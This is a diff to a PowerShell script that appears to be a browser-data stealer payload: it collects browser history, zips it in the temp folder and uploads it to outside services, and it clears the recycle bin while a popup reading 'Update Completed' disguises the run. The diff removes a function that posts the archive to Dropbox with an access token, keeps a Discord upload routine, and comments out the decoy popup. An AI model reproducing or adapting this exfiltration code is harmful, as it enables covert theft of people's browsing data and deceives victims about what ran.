@@ -51,8 +51,6 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 # Enter your access tokens below. At least one has to be provided but both can be used at the same time. 
 
-#$db = ""
-
 #$dc = ""
 
 ############################################################################################################################################################
@@ -517,23 +515,7 @@ Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\B
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
-# Upload output file to dropbox
-
-function dropbox {
-$TargetFilePath="/$ZIP"
-$SourceFilePath="$env:TEMP\$ZIP"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){dropbox}
-
-############################################################################################################################################################
+# Upload output file to discord
 
 function Upload-Discord {
 
@@ -590,4 +572,4 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 # Popup message to signal the payload is done
 
-$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
+# $done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
